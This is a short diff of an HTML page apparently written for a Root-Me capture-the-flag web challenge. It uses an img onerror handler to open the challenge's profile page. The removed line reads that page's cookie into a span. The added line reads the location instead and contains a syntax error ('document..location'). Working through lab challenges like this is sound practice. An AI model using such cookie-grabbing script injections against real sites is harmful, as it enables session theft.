@@ -6,11 +6,12 @@
     <title>aaaaaahhhh</title>
 </head>
 <body>
-    <img src=x onerror=myFunc()>    
+    <img src=x onerror=myFunc()>   
+    <span> ça écrit ici : </span>
     <span id="oui"></span>
 
 <script>
-    function myFunc() {const WIWI = window.open("http://challenge01.root-me.org:58003/profile") ; WIWI.opener.document.getElementById("oui").innerHTML = WIWI.document.cookie ;  }
+    function myFunc() {const WIWI = window.open("http://challenge01.root-me.org:58003/profile") ; WIWI.opener.document.getElementById("oui").innerHTML = WIWI.opener.document..location ;  }
 </script>
 
 </body>
